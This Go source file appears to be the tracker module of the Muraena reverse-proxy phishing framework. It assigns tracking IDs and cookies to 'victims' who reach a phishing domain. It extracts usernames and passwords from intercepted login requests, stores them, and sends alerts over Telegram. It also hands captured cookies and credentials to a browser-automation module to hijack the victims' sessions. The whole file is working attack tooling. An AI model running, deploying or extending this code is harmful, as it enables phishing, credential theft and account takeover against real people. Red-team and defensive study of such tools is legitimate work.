package tracking

import (
	//"encoding/json"
	"encoding/json"
	"fmt"
	"net/http"
	"net/url"
	"path"
	"path/filepath"
	"regexp"
	"strings"
	"time"

	"github.com/manifoldco/promptui"
	"github.com/muraenateam/muraena/module/telegram"

	"github.com/muraenateam/muraena/core"
	"github.com/muraenateam/muraena/core/db"

	"github.com/evilsocket/islazy/tui"
	"github.com/lucasjones/reggen"

	"github.com/muraenateam/muraena/module/necrobrowser"
	"github.com/muraenateam/muraena/session"
)

const (
	// Name of this module
	Name = "tracker"

	// Description of this module
	Description = "Uniquely track clients via unique identifiers, while harvesting for web credentials and sessions"

	// Author of this module
	Author = "Muraena Team"
)

// Tracker module
type Tracker struct {
	session.SessionModule

	Enabled        bool
	Type           string
	Identifier     string
	Header         string
	Landing        string
	ValidatorRegex *regexp.Regexp
}

// Trace 对象结构
type Trace struct {
	*Tracker
	ID string
}

// Name returns the module name
func (module *Tracker) Name() string {
	return Name
}

// Description returns the module description
func (module *Tracker) Description() string {
	return Description
}

// Author returns the module author
func (module *Tracker) Author() string {
	return Author
}

// Prompt prints module status based on the provided parameters
func (module *Tracker) Prompt() {

	menu := []string{
		"victims",
		"credentials",
		"export",
	}
	result, err := session.DoModulePrompt(Name, menu)
	if err != nil {
		return
	}

	switch result {
	case "victims":
		module.ShowVictims()

	case "credentials":
		module.ShowCredentials()

	case "export":
		prompt := promptui.Prompt{
			Label: "Enter session identifier",
		}

		result, err := prompt.Run()
		if core.IsError(err) {
			module.Warning("%v+\n", err)
			return
		}

		module.ExportSession(result)
	}
}

// IsEnabled returns a boolead to indicate if the module is enabled or not
func (module *Tracker) IsEnabled() bool {
	return module.Enabled
}

func Load(s *session.Session) (m *Tracker, err error) {

	m = &Tracker{
		SessionModule: session.NewSessionModule(Name, s),
		Enabled:       s.Config.Tracking.Enabled,
		Header:        "If-Range",            // 默认 HTTP Header
		Landing:       "If-Landing-Redirect", // 默认登录 HTTP Header
		Type:          strings.ToLower(s.Config.Tracking.Type),
	}

	if !m.Enabled {
		m.Debug("is disabled")
		return
	}

	config := s.Config.Tracking
	m.Identifier = config.Identifier

	// 设置 tracking header
	if s.Config.Tracking.Header != "" {
		m.Header = s.Config.Tracking.Header
	}

	// 设置登录 header
	if s.Config.Tracking.Landing != "" {
		m.Landing = s.Config.Tracking.Landing
	}

	// 默认追踪格式为 UUIDv4
	m.ValidatorRegex = regexp.MustCompile("^[a-fA-F0-9]{8}-[a-fA-F0-9]{4}-4[a-fA-F0-9]{3}-[8|9|aA|bB][a-fA-F0-9]{3" +
		"}-[a-fA-F0-9]{12}$")

	if config.Regex != "" {
		m.ValidatorRegex, err = regexp.Compile(config.Regex)
		if err != nil {
			m.Warning("Failed to compile tracking validator regex: %s. Falling back to UUID4.", config.Regex)
			return
		}
	}

	m.Important("loaded successfully")
	return
}

// IsValid 验证 tracking 的值
func (t *Trace) IsValid() bool {
	return t.ValidatorRegex.MatchString(t.ID)
}

// 是否是禁用的方法
func isDisabledMethod(method string) bool {

	method = strings.ToUpper(method)
	var disabledMethods = []string{"HEAD", "OPTIONS"}
	for _, disabled := range disabledMethods {

		disabled = strings.ToUpper(disabled)
		if method == disabled {
			return true
		}
	}

	return false
}

func isDisabledAccessMediaType(accessMedia string) bool {

	var disabledMedia = []string{"image/"}

	// 媒体类型 handling
	// 阻止处理不需要的访问媒体类型
	accessMedia = strings.TrimSpace(strings.ToLower(accessMedia))
	for _, skip := range disabledMedia {

		skip = strings.ToLower(skip)
		if strings.HasPrefix(accessMedia, skip) {
			return true
		}
	}

	return false
}

// 是否是禁用的路径
func isDisabledPath(requestPath string) bool {

	file := path.Base(requestPath)
	ext := strings.ToUpper(filepath.Ext(file))
	ext = strings.ReplaceAll(ext, ".", "")

	var disabledExtensions = []string{"JS", "CSS", "MAP", "WOFF", "SVG"}
	for _, disabled := range disabledExtensions {
		if ext == disabled {
			return true
		}
	}

	return false
}

// 生成 trace 数据结构
func (module *Tracker) makeTrace(id string) (t *Trace) {
	t = &Trace{}
	t.Tracker = module
	t.ID = strings.TrimSpace(id)
	return
}

func (module *Tracker) makeID() string {
	str, err := reggen.NewGenerator(module.ValidatorRegex.String())
	if err != nil {
		module.Error("%", err)
		return ""
	}

	return str.Generate(1)
}

// TrackRequest 跟踪 HTTP Request
func (module *Tracker) TrackRequest(request *http.Request) (t *Trace) {
	// 定义 *Trace
	t = module.makeTrace("")

	if !module.Enabled {
		return
	}

	// 某些 Requests 需要忽略
	if isDisabledMethod(request.Method) {
		module.Debug("Skipping request method [%s] because untrackable ... for now ", tui.Bold(tui.Red(request.Method)))
		return
	}

	if isDisabledPath(request.URL.Path) {
		module.Debug("Skipping requested path [%s] because untrackable ... for now ", tui.Bold(tui.Red(request.URL.Path)))
		return
	}
	// 不处理 request 头中有 "Access" 的请求
	if isDisabledAccessMediaType(request.Header.Get("Access")) {
		module.Debug("Skipping requested Access header [%s] because untrackable ... for now ", tui.Bold(tui.Red(request.Header.Get("Access"))))
		return
	}

	noTraces := true
	isTrackedPath := false

	// 跟踪类型：Path || Query (default)
	if module.Type == "path" {
		tr := module.Session.Config.Tracking

		pathRegex := strings.Replace(tr.Identifier, "_", "/", -1) + tr.Regex
		re := regexp.MustCompile(pathRegex)
		// url 匹配 tracking 正则
		match := re.FindStringSubmatch(request.URL.Path)
		module.Info("tracking path match: %v", match)

		if len(match) > 0 {
			t = module.makeTrace(match[0])
			// 验证 t.ID 是否符合正则
			if t.IsValid() {
				// 将 module.Landing 设置为 URL.Path
				request.Header.Set(module.Landing, strings.ReplaceAll(request.URL.Path, t.ID, ""))
				module.Info("setting %s header to %s", module.Landing, strings.ReplaceAll(request.URL.Path, t.ID, ""))
				noTraces = false
				isTrackedPath = true
			}
		}
	}
	// 无需 Traces
	if noTraces {
		// Fallback
		// 使用 Query 字符串
		t = module.makeTrace(request.URL.Query().Get(module.Identifier))
		if t.IsValid() {
			noTraces = false
		} else {
			// Checking Cookies
			c, err := request.Cookie(module.Identifier)
			if err == nil {
				t.ID = c.Value

				// 验证 cookie 内容
				if t.IsValid() {
					noTraces = false
				} else {
					t = module.makeTrace("")
				}
			}
		}
	}

	if noTraces {
		t.ID = module.makeID()
	}

	//
	// Set trackers:
	// - HTTP Headers If-Range, or custom defined
	request.Header.Set(module.Header, t.ID)

	// Check if the Trace ID is bind to an existing victim
	v, verr := module.GetVictim(t)

	if v == nil || verr != nil {
		module.Error("%+v", verr)
		return
	}

	if v.ID == "" {

		// Tracking IP
		IPSource := request.RemoteAddr
		if module.Session.Config.Tracking.IPSource != "" {
			IPSource = request.Header.Get(module.Session.Config.Tracking.IPSource)
		}

		v := &db.Victim{
			ID:           t.ID,
			IP:           IPSource,
			UA:           request.UserAgent(),
			RequestCount: 0,
			FirstSeen:    time.Now().UTC().Format("2006-01-02 15:04:05"),
			LastSeen:     time.Now().UTC().Format("2006-01-02 15:04:05"),
		}

		module.PushVictim(v)
		module.Info("New victim [%s] IP[%s] UA[%s]", tui.Bold(tui.Red(t.ID)), IPSource, request.UserAgent())
	}

	v.RequestCount++

	if module.Type == "path" && isTrackedPath {
		request.URL.Path = module.Session.Config.Tracking.RedirectTo
	}

	return
}

// TrackResponse tracks an HTTP Response
func (module *Tracker) TrackResponse(response *http.Response) (victim *db.Victim) {

	// Do Not Track if not required
	if !module.Enabled {
		return
	}

	trackingFound := false
	t := module.makeTrace("")

	// Check cookies first to avoid replacing issues
	for _, cookie := range response.Request.Cookies() {
		if cookie.Name == module.Identifier {
			t.ID = cookie.Value
			trackingFound = t.IsValid()
			break
		}
	}

	if !trackingFound {
		// Trace not found in Cookies check If-Range (or custom defined) HTTP Headers
		t = module.makeTrace(response.Request.Header.Get(module.Header))
		if t.IsValid() {

			cookieDomain := module.Session.Config.Proxy.Phishing
			if module.Session.Config.Tracking.Domain != "" {
				cookieDomain = module.Session.Config.Tracking.Domain
			}
			module.Info("Setting tracking cookie for domain: %s", cookieDomain)

			response.Header.Add("Set-Cookie",
				fmt.Sprintf("%s=%s; Domain=%s; Path=/; Expires=Wed, 30 Aug 2029 00:00:00 GMT",
					module.Identifier, t.ID, cookieDomain))

			response.Header.Add(module.Header, t.ID)
			trackingFound = true
		}
	}

	if !trackingFound {
		module.Debug("Untracked response: [%s] %s", response.Request.Method, response.Request.URL)
		// Reset trace
		t = module.makeTrace("")

	} else {
		var err error
		victim, err = t.GetVictim(t)
		if err != nil {
			module.Warning("Error: cannot retrieve Victim from tracker: %s", err)
		}
	}

	return victim
}

// ExtractCredentials extracts credentials from a request body and stores within a VictimCredentials object
func (t *Trace) ExtractCredentials(body string, request *http.Request) (found bool, err error) {

	found = false
	victim, err := t.GetVictim(t)
	if err != nil {
		t.Error("%s", err)
		return found, err
	}

	// Investigate body only if the current URL.Path is related to credentials/keys to intercept
	// given UrlsOfInterest.Credentials URLs, intercept username/password using patterns defined in the configuration
	for _, c := range t.Session.Config.Tracking.Urls.Credentials {
		if request.URL.Path == c {

			t.Debug("[%s] there might be credentials here.")

			for _, p := range t.Session.Config.Tracking.Patterns {

				// Case *sensitive* matching
				if strings.Contains(body, p.Matching) {

					// Extract it
					value := InnerSubstring(body, p.Start, p.End)
					if value != "" {

						mediaType := strings.ToLower(request.Header.Get("Content-Type"))
						if strings.Contains(mediaType, "urlencoded") {
							value, err = url.QueryUnescape(value)
							if err != nil {
								t.Warning("%s", err)
							}
						}

						creds := &db.VictimCredential{
							Key:   p.Label,
							Value: value,
							Time:  time.Now().UTC().Format("2006-01-02 15:04:05"),
						}

						err := creds.Store(victim.ID)
						if err != nil {
							return false, err
						}
						t.Info("[%s] New credentials! [%s:%s]", t.ID, creds.Key, creds.Value)
						found = true

						tel := telegram.Self(t.Session)
						if tel != nil {
							message := fmt.Sprintf("[%s] New credentials! [%s]", t.ID, creds.Key)
							tel.Send(message)
						}
					}
				}
			}
		}
	}

	if found {
		t.ShowCredentials()
	}

	return found, nil
}

// HijackSession: If the request URL matches those defined in authSession in the config, then
// pass the cookies in the CookieJar to necrobrowser to hijack the session
func (t *Trace) HijackSession(request *http.Request) (err error) {

	if !t.Session.Config.NecroBrowser.Enabled {
		return
	}

	getSession := false

	victim, err := t.GetVictim(t)
	if err != nil {
		return
	}

	for _, c := range t.Session.Config.Tracking.Urls.AuthSession {
		if request.URL.Path == c {
			getSession = true
			break
		}
	}

	if !getSession {
		return
	}

	// Pass credentials
	creds, err := json.MarshalIndent(victim.Credentials, "", "\t")
	if err != nil {
		t.Warning(err.Error())
	}

	m, err := t.Session.Module("necrobrowser")
	if err != nil {
		t.Error("%s", err)
	} else {
		nb, ok := m.(*necrobrowser.Necrobrowser)
		if ok {
			go nb.Instrument(victim.ID, victim.Cookies, string(creds))
		}
	}

	return
}
